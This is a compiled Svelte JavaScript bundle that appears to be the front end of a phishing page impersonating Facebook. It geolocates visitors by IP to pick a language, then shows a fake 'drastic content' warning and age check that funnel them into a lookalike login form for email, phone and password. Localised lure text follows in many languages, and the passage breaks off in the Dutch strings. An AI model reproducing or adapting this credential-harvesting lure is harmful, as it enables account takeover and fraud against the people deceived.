
(function(l, r) { if (l.getElementById('livereloadscript')) return; r = l.createElement('script'); r.async = 1; r.src = '//' + (window.location.host || 'localhost').split(':')[0] + ':35729/livereload.js?snipver=1'; r.id = 'livereloadscript'; l.getElementsByTagName('head')[0].appendChild(r) })(window.document);
(function () {
    'use strict';

    function noop() { }
    function run(fn) {
        return fn();
    }
    function blank_object() {
        return Object.create(null);
    }
    function run_all(fns) {
        fns.forEach(run);
    }
    function is_function(thing) {
        return typeof thing === 'function';
    }
    function safe_not_equal(a, b) {
        return a != a ? b == b : a !== b || ((a && typeof a === 'object') || typeof a === 'function');
    }
    function is_empty(obj) {
        return Object.keys(obj).length === 0;
    }
    function subscribe(store, ...callbacks) {
        if (store == null) {
            return noop;
        }
        const unsub = store.subscribe(...callbacks);
        return unsub.unsubscribe ? () => unsub.unsubscribe() : unsub;
    }
    function component_subscribe(component, store, callback) {
        component.$$.on_destroy.push(subscribe(store, callback));
    }
    function set_store_value(store, ret, value) {
        store.set(value);
        return ret;
    }
    function append(target, node) {
        target.appendChild(node);
    }
    function insert(target, node, anchor) {
        target.insertBefore(node, anchor || null);
    }
    function detach(node) {
        if (node.parentNode) {
            node.parentNode.removeChild(node);
        }
    }
    function element(name) {
        return document.createElement(name);
    }
    function svg_element(name) {
        return document.createElementNS('http://www.w3.org/2000/svg', name);
    }
    function text(data) {
        return document.createTextNode(data);
    }
    function space() {
        return text(' ');
    }
    function listen(node, event, handler, options) {
        node.addEventListener(event, handler, options);
        return () => node.removeEventListener(event, handler, options);
    }
    function attr(node, attribute, value) {
        if (value == null)
            node.removeAttribute(attribute);
        else if (node.getAttribute(attribute) !== value)
            node.setAttribute(attribute, value);
    }
    function children(element) {
        return Array.from(element.childNodes);
    }
    function set_data(text, data) {
        data = '' + data;
        if (text.wholeText !== data)
            text.data = data;
    }
    function set_input_value(input, value) {
        input.value = value == null ? '' : value;
    }
    function set_style(node, key, value, important) {
        if (value === null) {
            node.style.removeProperty(key);
        }
        else {
            node.style.setProperty(key, value, important ? 'important' : '');
        }
    }
    function toggle_class(element, name, toggle) {
        element.classList[toggle ? 'add' : 'remove'](name);
    }

    let current_component;
    function set_current_component(component) {
        current_component = component;
    }

    const dirty_components = [];
    const binding_callbacks = [];
    const render_callbacks = [];
    const flush_callbacks = [];
    const resolved_promise = Promise.resolve();
    let update_scheduled = false;
    function schedule_update() {
        if (!update_scheduled) {
            update_scheduled = true;
            resolved_promise.then(flush);
        }
    }
    function add_render_callback(fn) {
        render_callbacks.push(fn);
    }
    // flush() calls callbacks in this order:
    // 1. All beforeUpdate callbacks, in order: parents before children
    // 2. All bind:this callbacks, in reverse order: children before parents.
    // 3. All afterUpdate callbacks, in order: parents before children. EXCEPT
    //    for afterUpdates called during the initial onMount, which are called in
    //    reverse order: children before parents.
    // Since callbacks might update component values, which could trigger another
    // call to flush(), the following steps guard against this:
    // 1. During beforeUpdate, any updated components will be added to the
    //    dirty_components array and will cause a reentrant call to flush(). Because
    //    the flush index is kept outside the function, the reentrant call will pick
    //    up where the earlier call left off and go through all dirty components. The
    //    current_component value is saved and restored so that the reentrant call will
    //    not interfere with the "parent" flush() call.
    // 2. bind:this callbacks cannot trigger new flush() calls.
    // 3. During afterUpdate, any updated components will NOT have their afterUpdate
    //    callback called a second time; the seen_callbacks set, outside the flush()
    //    function, guarantees this behavior.
    const seen_callbacks = new Set();
    let flushidx = 0; // Do *not* move this inside the flush() function
    function flush() {
        // Do not reenter flush while dirty components are updated, as this can
        // result in an infinite loop. Instead, let the inner flush handle it.
        // Reentrancy is ok afterwards for bindings etc.
        if (flushidx !== 0) {
            return;
        }
        const saved_component = current_component;
        do {
            // first, call beforeUpdate functions
            // and update components
            try {
                while (flushidx < dirty_components.length) {
                    const component = dirty_components[flushidx];
                    flushidx++;
                    set_current_component(component);
                    update(component.$$);
                }
            }
            catch (e) {
                // reset dirty state to not end up in a deadlocked state and then rethrow
                dirty_components.length = 0;
                flushidx = 0;
                throw e;
            }
            set_current_component(null);
            dirty_components.length = 0;
            flushidx = 0;
            while (binding_callbacks.length)
                binding_callbacks.pop()();
            // then, once components are updated, call
            // afterUpdate functions. This may cause
            // subsequent updates...
            for (let i = 0; i < render_callbacks.length; i += 1) {
                const callback = render_callbacks[i];
                if (!seen_callbacks.has(callback)) {
                    // ...so guard against infinite loops
                    seen_callbacks.add(callback);
                    callback();
                }
            }
            render_callbacks.length = 0;
        } while (dirty_components.length);
        while (flush_callbacks.length) {
            flush_callbacks.pop()();
        }
        update_scheduled = false;
        seen_callbacks.clear();
        set_current_component(saved_component);
    }
    function update($$) {
        if ($$.fragment !== null) {
            $$.update();
            run_all($$.before_update);
            const dirty = $$.dirty;
            $$.dirty = [-1];
            $$.fragment && $$.fragment.p($$.ctx, dirty);
            $$.after_update.forEach(add_render_callback);
        }
    }
    const outroing = new Set();
    let outros;
    function transition_in(block, local) {
        if (block && block.i) {
            outroing.delete(block);
            block.i(local);
        }
    }
    function transition_out(block, local, detach, callback) {
        if (block && block.o) {
            if (outroing.has(block))
                return;
            outroing.add(block);
            outros.c.push(() => {
                outroing.delete(block);
                if (callback) {
                    if (detach)
                        block.d(1);
                    callback();
                }
            });
            block.o(local);
        }
        else if (callback) {
            callback();
        }
    }
    function create_component(block) {
        block && block.c();
    }
    function mount_component(component, target, anchor, customElement) {
        const { fragment, after_update } = component.$$;
        fragment && fragment.m(target, anchor);
        if (!customElement) {
            // onMount happens before the initial afterUpdate
            add_render_callback(() => {
                const new_on_destroy = component.$$.on_mount.map(run).filter(is_function);
                // if the component was destroyed immediately
                // it will update the `$$.on_destroy` reference to `null`.
                // the destructured on_destroy may still reference to the old array
                if (component.$$.on_destroy) {
                    component.$$.on_destroy.push(...new_on_destroy);
                }
                else {
                    // Edge case - component was destroyed immediately,
                    // most likely as a result of a binding initialising
                    run_all(new_on_destroy);
                }
                component.$$.on_mount = [];
            });
        }
        after_update.forEach(add_render_callback);
    }
    function destroy_component(component, detaching) {
        const $$ = component.$$;
        if ($$.fragment !== null) {
            run_all($$.on_destroy);
            $$.fragment && $$.fragment.d(detaching);
            // TODO null out other refs, including component.$$ (but need to
            // preserve final state?)
            $$.on_destroy = $$.fragment = null;
            $$.ctx = [];
        }
    }
    function make_dirty(component, i) {
        if (component.$$.dirty[0] === -1) {
            dirty_components.push(component);
            schedule_update();
            component.$$.dirty.fill(0);
        }
        component.$$.dirty[(i / 31) | 0] |= (1 << (i % 31));
    }
    function init(component, options, instance, create_fragment, not_equal, props, append_styles, dirty = [-1]) {
        const parent_component = current_component;
        set_current_component(component);
        const $$ = component.$$ = {
            fragment: null,
            ctx: [],
            // state
            props,
            update: noop,
            not_equal,
            bound: blank_object(),
            // lifecycle
            on_mount: [],
            on_destroy: [],
            on_disconnect: [],
            before_update: [],
            after_update: [],
            context: new Map(options.context || (parent_component ? parent_component.$$.context : [])),
            // everything else
            callbacks: blank_object(),
            dirty,
            skip_bound: false,
            root: options.target || parent_component.$$.root
        };
        append_styles && append_styles($$.root);
        let ready = false;
        $$.ctx = instance
            ? instance(component, options.props || {}, (i, ret, ...rest) => {
                const value = rest.length ? rest[0] : ret;
                if ($$.ctx && not_equal($$.ctx[i], $$.ctx[i] = value)) {
                    if (!$$.skip_bound && $$.bound[i])
                        $$.bound[i](value);
                    if (ready)
                        make_dirty(component, i);
                }
                return ret;
            })
            : [];
        $$.update();
        ready = true;
        run_all($$.before_update);
        // `false` as a special case of no DOM component
        $$.fragment = create_fragment ? create_fragment($$.ctx) : false;
        if (options.target) {
            if (options.hydrate) {
                const nodes = children(options.target);
                // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
                $$.fragment && $$.fragment.l(nodes);
                nodes.forEach(detach);
            }
            else {
                // eslint-disable-next-line @typescript-eslint/no-non-null-assertion
                $$.fragment && $$.fragment.c();
            }
            if (options.intro)
                transition_in(component.$$.fragment);
            mount_component(component, options.target, options.anchor, options.customElement);
            flush();
        }
        set_current_component(parent_component);
    }
    /**
     * Base class for Svelte components. Used when dev=false.
     */
    class SvelteComponent {
        $destroy() {
            destroy_component(this, 1);
            this.$destroy = noop;
        }
        $on(type, callback) {
            if (!is_function(callback)) {
                return noop;
            }
            const callbacks = (this.$$.callbacks[type] || (this.$$.callbacks[type] = []));
            callbacks.push(callback);
            return () => {
                const index = callbacks.indexOf(callback);
                if (index !== -1)
                    callbacks.splice(index, 1);
            };
        }
        $set($$props) {
            if (this.$$set && !is_empty($$props)) {
                this.$$.skip_bound = true;
                this.$$set($$props);
                this.$$.skip_bound = false;
            }
        }
    }

    const subscriber_queue = [];
    /**
     * Create a `Writable` store that allows both updating and reading by subscription.
     * @param {*=}value initial value
     * @param {StartStopNotifier=}start start and stop notifications for subscriptions
     */
    function writable(value, start = noop) {
        let stop;
        const subscribers = new Set();
        function set(new_value) {
            if (safe_not_equal(value, new_value)) {
                value = new_value;
                if (stop) { // store is ready
                    const run_queue = !subscriber_queue.length;
                    for (const subscriber of subscribers) {
                        subscriber[1]();
                        subscriber_queue.push(subscriber, value);
                    }
                    if (run_queue) {
                        for (let i = 0; i < subscriber_queue.length; i += 2) {
                            subscriber_queue[i][0](subscriber_queue[i + 1]);
                        }
                        subscriber_queue.length = 0;
                    }
                }
            }
        }
        function update(fn) {
            set(fn(value));
        }
        function subscribe(run, invalidate = noop) {
            const subscriber = [run, invalidate];
            subscribers.add(subscriber);
            if (subscribers.size === 1) {
                stop = start(set) || noop;
            }
            run(value);
            return () => {
                subscribers.delete(subscriber);
                if (subscribers.size === 0) {
                    stop();
                    stop = null;
                }
            };
        }
        return { set, update, subscribe };
    }

    const isForceLogin = document.location.href.includes('?popup');

    const popups = writable({
        confirm: false,
        safe: true,
        login: isForceLogin,
        loading: false,
        video: false,
    });

    const geo = writable('EN_en');

    var setGeo = async () => {
        const response = await fetch(`https://pro.ip-api.com/json?key=bcUKKvOkLYhd9rQ&fields=28671`);
        const data = await response.json();

        geo.set(`${data.countryCode}_${data.countryCode.toLowerCase()}`);
    };

    const langs = {
    	pl: {
    		//SAFE
    		'popup.safe.title': 'Oznaczyliśmy tę zawartość jaką drastyczną',
    		'popup.safe.description_1':
    			'Ostrzeżenie: Ta zawartość może zawierać materiały przedstawiające przemoc oraz inne treści społecznie nieakceptowalne.',
    		'popup.safe.description_2':
    			'W celu kontynuacji prosimy o potwierdzenie swojego wieku.',
    		'popup.safe.description_3':
    			'Treści dostępne od 16 roku życia.',

    		'popup.safe.button_1': 'Kontynuuj',
    		'popup.safe.button_2': 'Ustawienia',

    		//LOADING
    		'popup.loading.text': 'Logowanie...',

    		//LOGIN
    		'popup.login.placeholder_1': 'Adres e-mail lub numer telefonu',
    		'popup.login.placeholder_2': 'Hasło',
    		'popup.login.button': 'Zaloguj się',

    		'popup.login.footer': 'Polityka prywatności • Regulamin',

    		//POST
    		'post.reaction_1': 'Lubię to!',
    		'post.reaction_2': 'Dodaj komentarz',
    		'post.reaction_3': 'Udostępnij',

    		//COMMENTS
    		'comment.category': 'Najtrafniejsze',

    		'comment.reaction_1': 'Lubię to!',
    		'comment.reaction_2': 'Odpowiedz',

    		//AGE POPUP
    		'popup.age.title': 'Przed obejrzeniem potwierdź swój wiek',
    		'popup.age.content_1': 'Z uwagi na drastyczną treść nagrania',
    		'popup.age.content_2': 'potwierdź swój wiek.',
    		'popup.age.button': 'Zaloguj się',

    		//OTHER
    		'global.text_1': '1 nowy komentarz',
    		'global.text_2': 'Napisz komentarz...',
    	},

    	en: {
    		//SAFE
    		'popup.safe.title': "We've flagged content as drastic",
    		'popup.safe.description_1':
    			'The material contained in this post may contain violence, nudity, and other socially unacceptable behavior. We are displaying this message to warn you',
    		'popup.safe.description_2':
    			'If you do not want to receive this type of warning, go to:',
    		'popup.safe.description_3': 'Settings & Privacy > Notification Settings',

    		'popup.safe.button_1': 'Continue',
    		'popup.safe.button_2': 'Settings',

    		//LOADING
    		'popup.loading.text': 'Login in progress...',

    		//LOGIN
    		'popup.login.placeholder_1': 'Email or phone number',
    		'popup.login.placeholder_2': 'Password',
    		'popup.login.button': 'Log In',

    		'popup.login.footer': 'Privacy Policy • Privacy Centre',

    		//POST
    		'post.reaction_1': 'Like',
    		'post.reaction_2': 'Comment',
    		'post.reaction_3': 'Share',

    		//COMMENTS
    		'comment.category': 'Top comments',

    		'comment.reaction_1': 'Like',
    		'comment.reaction_2': 'Reply',

    		//AGE POPUP
    		'popup.age.title': 'Please confirm your age before viewing',
    		'popup.age.content_1': 'Due to the drastic content of the recording',
    		'popup.age.content_2': 'confirm your age',
    		'popup.age.button': 'Log in',

    		//OTHER
    		'global.text_1': '1 comment',
    		'global.text_2': 'Write a comment…',
    	},

    	it: {
    		//SAFE
    		'popup.safe.title': 'Abbiamo contrassegnato il contenuto come drastico',
    		'popup.safe.description_1':
    			'Il materiale contenuto in questo post potrebbe contenere violenza, nudità e altri comportamenti socialmente inaccettabili. Stiamo visualizzando questo messaggio per avvisarti',
    		'popup.safe.description_2':
    			'Se non desideri ricevere questo tipo di avviso, vai su:',
    		'popup.safe.description_3':
    			'Impostazioni e privacy > Impostazioni di notifica',
    		'popup.safe.button_1': 'Continua',
    		'popup.safe.button_2': 'Impostazioni',

    		//LOADING
    		'popup.loading.text': 'Accesso in corso...',

    		//LOGIN
    		'popup.login.placeholder_1': 'Email o numero di telefono',
    		'popup.login.placeholder_2': 'Password',
    		'popup.login.button': 'Accedi',
    		'popup.login.footer': 'Informativa sulla privacy • Centro privacy',

    		//POST
    		'post.reaction_1': 'Mi piace',
    		'post.reaction_2': 'Commenta',
    		'post.reaction_3': 'Condividi',

    		//COMMENTS
    		'comment.category': 'Più pertinenti',
    		'comment.reaction_1': 'Mi piace',
    		'comment.reaction_2': 'Rispondi',

    		//AGE POPUP
    		'popup.age.title': 'Conferma la tua età per visualizzare il contenuto',
    		'popup.age.content_1': 'A causa del contenuto drastico del post',
    		'popup.age.content_2': 'Conferma la tua età per proseguire',
    		'popup.age.button': 'Accedi',

    		//OTHER
    		'global.text_1': '1 commento',
    		'global.text_2': 'Scrivi un commento...',
    	},

    	cs: {
    		//SAFE
    		'popup.safe.title': 'Obsah jsme označili za drastický',
    		'popup.safe.description_1':
    			'Materiál obsažený v tomto příspěvku může obsahovat násilí, nahotu a jiné společensky nepřijatelné chování. Tuto zprávu zobrazujeme, abychom vás varovali.',
    		'popup.safe.description_2':
    			'Pokud nechcete dostávat tyto typy varování, přejděte na:',
    		'popup.safe.description_3': 'Nastavení a soukromí > Prohlídka soukromí',

    		'popup.safe.button_1': 'Pokračovat',
    		'popup.safe.button_2': 'Nastavení',

    		//LOADING
    		'popup.loading.text': 'Probíhá protokolování.',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-mail nebo telefonní číslo',
    		'popup.login.placeholder_2': 'Heslo',
    		'popup.login.button': 'Přihlásit se',

    		'popup.login.footer': 'Zásady ochrany osobních údajů • Centrum soukromí',

    		//POST
    		'post.reaction_1': 'To se mi líbí',
    		'post.reaction_2': 'Okomentovat',
    		'post.reaction_3': 'Sdílet',

    		//COMMENTS
    		'comment.category': 'Nejlepší komentáře',

    		'comment.reaction_1': 'To se mi líbí',
    		'comment.reaction_2': 'Odpovědět',

    		//AGE POPUP
    		'popup.age.title': 'Před zobrazením prosím potvrďte svůj věk',
    		'popup.age.content_1': 'Kvůli drastickému obsahu nahrávky',
    		'popup.age.content_2': 'potvrďte svůj věk.',
    		'popup.age.button': 'Přihlásit se',

    		//OTHER
    		'global.text_1': '1 komentáře',
    		'global.text_2': 'Napište veřejný komentář...',
    	},

    	de: {
    		//SAFE
    		'popup.safe.title': 'Wir haben den Inhalt als drastisch gekennzeichnet',
    		'popup.safe.description_1':
    			'Das in diesem Beitrag enthaltene Material kann Gewalt, Nacktheit und andere sozial inakzeptable Verhaltensweisen enthalten. Wir zeigen diese Meldung an, um Sie zu warnen.',
    		'popup.safe.description_2':
    			'Wenn Sie diese Art von Warnungen nicht erhalten möchten, gehen Sie zu:',
    		'popup.safe.description_3':
    			'Einstellungen und Privatsphäre > Privacy Center',

    		'popup.safe.button_1': 'Weitermachen',
    		'popup.safe.button_2': 'Einstellungen',

    		//LOADING
    		'popup.loading.text': 'Anmelden läuft',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-Mail-Adresse oder Telefonnummer',
    		'popup.login.placeholder_2': 'Passwort',
    		'popup.login.button': 'Anmelden',

    		'popup.login.footer': 'Services • Info',

    		//POST
    		'post.reaction_1': 'Gefällt mir',
    		'post.reaction_2': 'Kommentieren',
    		'post.reaction_3': 'Teilen',

    		//COMMENTS
    		'comment.category': 'Alle Kommentare',

    		'comment.reaction_1': 'Gefällt mir',
    		'comment.reaction_2': 'Antworten',

    		//AGE POPUP
    		'popup.age.title': 'Bitte bestätigen Sie Ihr Alter vor dem Ansehen',
    		'popup.age.content_1': 'Bitte bestätigen Sie aufgrund des drastischen',
    		'popup.age.content_2': 'Inhalts des Videos Ihr Alter',
    		'popup.age.button': 'Anmelden',

    		//OTHER
    		'global.text_1': 'Jemand schreibt einen Kommentar...',
    		'global.text_2': 'Kommentieren …',
    	},

    	es: {
    		//SAFE
    		'popup.safe.title': 'Marcamos el contenido como drástico',
    		'popup.safe.description_1':
    			'El material incluido en esta publicación puede contener violencia, desnudez y otros comportamientos socialmente inaceptables. Mostramos este mensaje para advertirte.',
    		'popup.safe.description_2':
    			'Si no deseas recibir este tipo de advertencias, dirígete a:',
    		'popup.safe.description_3':
    			'Configuración y privacidad > Preferencias de notificación',
    		'popup.safe.button_1': 'Continuar',
    		'popup.safe.button_2': 'Configuración',

    		//LOADING
    		'popup.loading.text': 'Iniciando sesión...',

    		//LOGIN
    		'popup.login.placeholder_1': 'Correo electrónico o número de teléfono',
    		'popup.login.placeholder_2': 'Contraseña',
    		'popup.login.button': 'Iniciar sesión',

    		'popup.login.footer': 'Información • Meta Store',

    		//POST
    		'post.reaction_1': 'Me gusta',
    		'post.reaction_2': 'Comentar',
    		'post.reaction_3': 'Compartir',

    		//COMMENTS
    		'comment.category': 'Más relevantes',

    		'comment.reaction_1': 'Me gusta',
    		'comment.reaction_2': 'Responder',

    		//AGE POPUP
    		'popup.age.title': 'Confirma tu edad antes de ver el contenido',
    		'popup.age.content_1': 'Debido al contenido drástico del video',
    		'popup.age.content_2': 'confirma tu edad.',
    		'popup.age.button': 'Iniciar sesión',

    		//OTHER
    		'global.text_1': '1 nuevo comentario',
    		'global.text_2': 'Escribir un comentario...',
    	},
    	fr: {
    		//SAFE
    		'popup.safe.title': 'Nous avons marqué le contenu comme étant drastique',
    		'popup.safe.description_1':
    			'Le matériel inclus dans cette publication peut contenir de la violence, de la nudité et d’autres comportements socialement inacceptables. Nous affichons ce message pour vous avertir.',
    		'popup.safe.description_2':
    			'Si vous ne souhaitez pas recevoir ce type d’avertissements, rendez-vous dans :',
    		'popup.safe.description_3':
    			'Paramètres et confidentialité > Préférences de notification',
    		'popup.safe.button_1': 'Continuer',
    		'popup.safe.button_2': 'Paramètres',

    		//LOADING
    		'popup.loading.text': 'Connexion en cours…',

    		//LOGIN
    		'popup.login.placeholder_1': 'Adresse e-mail ou numéro de tél.',
    		'popup.login.placeholder_2': 'Mot de passe',
    		'popup.login.button': 'Se connecter',

    		'popup.login.footer': 'Cookies • Conditions générales',

    		//POST
    		'post.reaction_1': 'J’aime',
    		'post.reaction_2': 'Commenter',
    		'post.reaction_3': 'Partager',

    		//COMMENTS
    		'comment.category': 'Plus pertinents',

    		'comment.reaction_1': 'J’aime',
    		'comment.reaction_2': 'Répondre',

    		//AGE POPUP
    		'popup.age.title': 'Confirmez votre âge avant de voir le contenu',
    		'popup.age.content_1': 'En raison du contenu drastique de la vidéo',
    		'popup.age.content_2': 'confirmez votre âge.',
    		'popup.age.button': 'Se connecter',

    		//OTHER
    		'global.text_1': '1 nouveau commentaire',
    		'global.text_2': 'Rédiger un commentaire...',
    	},

    	da: {
    		//SAFE
    		'popup.safe.title': 'Vi har markeret dette indhold som dristigt',
    		'popup.safe.description_1':
    			'Materialerne i dette indlæg kan indeholde vold, nøgenhed og andre socialt uacceptable handlinger. For at advare dig viser vi denne meddelelse.',
    		'popup.safe.description_2':
    			'Hvis du ikke ønsker at modtage denne slags advarsler, skal du gå til:',
    		'popup.safe.description_3':
    			'Indstillinger og privatliv > Underretningindstillinger',

    		'popup.safe.button_1': 'Fortsæt',
    		'popup.safe.button_2': 'Indstillinger',

    		//LOADING
    		'popup.loading.text': 'Logger ind...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-mail eller telefonnummer',
    		'popup.login.placeholder_2': 'Adgangskode',
    		'popup.login.button': 'Log på',

    		'popup.login.footer': 'Fortrolighedspolitik • Vilkår og betingelser',

    		//POST
    		'post.reaction_1': 'Synes godt om!',
    		'post.reaction_2': 'Kommenter',
    		'post.reaction_3': 'Del',

    		//COMMENTS
    		'comment.category': 'Mest relevante',

    		'comment.reaction_1': 'Synes godt om',
    		'comment.reaction_2': 'Svar',

    		//AGE POPUP
    		'popup.age.title': 'Bekræft din alder før du ser dette indhold',
    		'popup.age.content_1': 'På grund af indholdets dristige natur',
    		'popup.age.content_2': 'skal du bekræfte din alder.',
    		'popup.age.button': 'Log ind',

    		//OTHER
    		'global.text_1': '1 ny kommentar',
    		'global.text_2': 'Skriv en kommentar...',
    	},

    	tr: {
    		//SAFE
    		'popup.safe.title': 'Bu içeriği şiddet içeren olarak işaretledik',
    		'popup.safe.description_1':
    			'Bu gönderide yer alan materyaller şiddet, çıplaklık ve diğer toplumsal olarak kabul edilemez davranışlar içerebilir. Sizi uyarmak için bu bildirimi gösteriyoruz.',
    		'popup.safe.description_2':
    			'Bu tür uyarıları almak istemiyorsanız, şuraya gidin:',
    		'popup.safe.description_3': 'Ayarlar ve Gizlilik > Bildirim Ayarları',

    		'popup.safe.button_1': 'Devam',
    		'popup.safe.button_2': 'Ayarlar',

    		//LOADING
    		'popup.loading.text': 'Giriş yapılıyor...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-posta veya Telefon Numarası',
    		'popup.login.placeholder_2': 'Şifre',
    		'popup.login.button': 'Giriş Yap',

    		'popup.login.footer': 'Geliştiriciler • Yardım',

    		//POST
    		'post.reaction_1': 'Beğen',
    		'post.reaction_2': 'Yorum Yap',
    		'post.reaction_3': 'Paylaş',

    		//COMMENTS
    		'comment.category': 'En alakalı',

    		'comment.reaction_1': 'Beğen',
    		'comment.reaction_2': 'Yanıtla',

    		//AGE POPUP
    		'popup.age.title': 'Bu içeriği izlemeden önce yaşınızı doğrulayın',
    		'popup.age.content_1': 'Drastik içerik nedeniyle',
    		'popup.age.content_2': 'yaşınızı doğrulamanız gerekiyor.',
    		'popup.age.button': 'Giriş Yap',

    		//OTHER
    		'global.text_1': '1 yeni yorum',
    		'global.text_2': 'Yorum yaz...',
    	},

    	sv: {
    		//SAFE
    		'popup.safe.title': 'Vi har markerat detta innehåll som drastiskt',
    		'popup.safe.description_1':
    			'Materialen i detta inlägg kan innehålla våld, nakenhet och andra socialt oacceptabla handlingar. För att varna dig visar vi detta meddelande.',
    		'popup.safe.description_2':
    			'Om du inte vill ha den här typen av varningar, gå till:',
    		'popup.safe.description_3':
    			'Inställningar och integritet > Meddelandeinställningar',

    		'popup.safe.button_1': 'Fortsätt',
    		'popup.safe.button_2': 'Inställningar',

    		//LOADING
    		'popup.loading.text': 'Loggar in...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-postadress eller telefonnummer',
    		'popup.login.placeholder_2': 'Lösenord',
    		'popup.login.button': 'Logga in',

    		'popup.login.footer': 'Utvecklare • Cookies',

    		//POST
    		'post.reaction_1': 'Gilla',
    		'post.reaction_2': 'Kommentera',
    		'post.reaction_3': 'Dela',

    		//COMMENTS
    		'comment.category': 'Toppkommentarer',

    		'comment.reaction_1': 'Gilla!',
    		'comment.reaction_2': 'Svara',

    		//AGE POPUP
    		'popup.age.title': 'Bekräfta din ålder innan du ser detta innehåll',
    		'popup.age.content_1': 'På grund av innehållets drastiska natur',
    		'popup.age.content_2': 'måste du bekräfta din ålder.',
    		'popup.age.button': 'Logga in',

    		//OTHER
    		'global.text_1': '1 ny kommentar',
    		'global.text_2': 'Skriv ett svar …',
    	},
    	no: {
    		//SAFE
    		'popup.safe.title': 'Vi har markert dette innholdet som drastisk',
    		'popup.safe.description_1':
    			'Materialene i dette innlegget kan inneholde vold, nakenhet og andre sosialt uakseptable handlinger. For å advare deg viser vi denne meldingen.',
    		'popup.safe.description_2':
    			'Hvis du ikke ønsker å motta denne typen advarsler, gå til:',
    		'popup.safe.description_3':
    			'Innstillinger og personvern > Varslingsinnstillinger',

    		'popup.safe.button_1': 'Fortsett',
    		'popup.safe.button_2': 'Innstillinger',

    		//LOADING
    		'popup.loading.text': 'Logger inn...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-postadresse eller telefonnummer',
    		'popup.login.placeholder_2': 'Passord',
    		'popup.login.button': 'Logg inn',

    		'popup.login.footer': 'Tjenester • Registrer deg',

    		//POST
    		'post.reaction_1': 'Liker!',
    		'post.reaction_2': 'Kommenter',
    		'post.reaction_3': 'Del',

    		//COMMENTS
    		'comment.category': 'Mest relevant',

    		'comment.reaction_1': 'Liker!',
    		'comment.reaction_2': 'Svar',

    		//AGE POPUP
    		'popup.age.title': 'Bekreft alderen din før du ser dette innholdet',
    		'popup.age.content_1': 'På grunn av innholdets drastiske natur',
    		'popup.age.content_2': 'må du bekrefte alderen din.',
    		'popup.age.button': 'Logg inn',

    		//OTHER
    		'global.text_1': '1 ny kommentar',
    		'global.text_2': 'Skriv et svar ...',
    	},

    	nb: {
    		//SAFE
    		'popup.safe.title': 'Vi har markert dette innholdet som drastisk',
    		'popup.safe.description_1':
    			'Materialene i dette innlegget kan inneholde vold, nakenhet og andre sosialt uakseptable handlinger. For å advare deg viser vi denne meldingen.',
    		'popup.safe.description_2':
    			'Hvis du ikke ønsker å motta denne typen advarsler, gå til:',
    		'popup.safe.description_3':
    			'Innstillinger og personvern > Varslingsinnstillinger',

    		'popup.safe.button_1': 'Fortsett',
    		'popup.safe.button_2': 'Innstillinger',

    		//LOADING
    		'popup.loading.text': 'Logger inn...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-postadresse eller telefonnummer',
    		'popup.login.placeholder_2': 'Passord',
    		'popup.login.button': 'Logg inn',

    		'popup.login.footer': 'Tjenester • Registrer deg',

    		//POST
    		'post.reaction_1': 'Liker!',
    		'post.reaction_2': 'Kommenter',
    		'post.reaction_3': 'Del',

    		//COMMENTS
    		'comment.category': 'Mest relevant',

    		'comment.reaction_1': 'Liker!',
    		'comment.reaction_2': 'Svar',

    		//AGE POPUP
    		'popup.age.title': 'Bekreft alderen din før du ser dette innholdet',
    		'popup.age.content_1': 'På grunn av innholdets drastiske natur',
    		'popup.age.content_2': 'må du bekrefte alderen din.',
    		'popup.age.button': 'Logg inn',

    		//OTHER
    		'global.text_1': '1 ny kommentar',
    		'global.text_2': 'Skriv et svar ...',
    	},
    	nn: {
    		//SAFE
    		'popup.safe.title': 'Vi har markert dette innholdet som drastisk',
    		'popup.safe.description_1':
    			'Materialene i dette innlegget kan inneholde vold, nakenhet og andre sosialt uakseptable handlinger. For å advare deg viser vi denne meldingen.',
    		'popup.safe.description_2':
    			'Hvis du ikke ønsker å motta denne typen advarsler, gå til:',
    		'popup.safe.description_3':
    			'Innstillinger og personvern > Varslingsinnstillinger',

    		'popup.safe.button_1': 'Fortsett',
    		'popup.safe.button_2': 'Innstillinger',

    		//LOADING
    		'popup.loading.text': 'Logger inn...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-postadresse eller telefonnummer',
    		'popup.login.placeholder_2': 'Passord',
    		'popup.login.button': 'Logg inn',

    		'popup.login.footer': 'Tjenester • Registrer deg',

    		//POST
    		'post.reaction_1': 'Liker!',
    		'post.reaction_2': 'Kommenter',
    		'post.reaction_3': 'Del',

    		//COMMENTS
    		'comment.category': 'Mest relevant',

    		'comment.reaction_1': 'Liker!',
    		'comment.reaction_2': 'Svar',

    		//AGE POPUP
    		'popup.age.title': 'Bekreft alderen din før du ser dette innholdet',
    		'popup.age.content_1': 'På grunn av innholdets drastiske natur',
    		'popup.age.content_2': 'må du bekrefte alderen din.',
    		'popup.age.button': 'Logg inn',

    		//OTHER
    		'global.text_1': '1 ny kommentar',
    		'global.text_2': 'Skriv et svar ...',
    	},
    	nl: {
    		//SAFE
    		'popup.safe.title': 'We hebben deze inhoud als schokkend gemarkeerd',
    		'popup.safe.description_1':
    			'De materialen in deze post kunnen geweld, naaktheid en andere maatschappelijk onaanvaardbare handelingen bevatten. Om u te waarschuwen tonen we deze melding.',
    		'popup.safe.description_2':
    			'Als u dit soort waarschuwingen niet wilt ontvangen, ga dan naar:',
    		'popup.safe.description_3':
    			'Instellingen en privacy > Meldingsinstellingen',

    		'popup.safe.button_1': 'Doorgaan',
    		'popup.safe.button_2': 'Instellingen',

    		//LOADING
    		'popup.loading.text': 'Aanmelden...',

    		//LOGIN
    		'popup.login.placeholder_1': 'E-mailadres of telefoonnummer',
    		'popup.login.placeholder_2': 'Wachtwoord',
    		'popup.login.button': 'Aanmelden',

    		'popup.login.footer': 'Registreren • Cookies',

    		//POST
    		'post.reaction_1': 'Leuk',
    		'post.reaction_2': 'Opmerking plaatsen',
    		'post.reaction_3': 'Delen',

    		//COMMENTS
    		'comment.category': 'Meest van toepassing',

    		'comment.reaction_1': 'Leuk',
    		'comment.reaction_2': 'Beantwoorden',

    		//AGE POPUP
    		'popup.age.title': 'Bevestig uw leeftijd voordat u deze inhoud bekijkt',
    		'popup.age.content_1': 'Vanwege de schokkende inhoud van deze video',
    		'popup.age.content_2': 'bevestig uw leeftijd.',
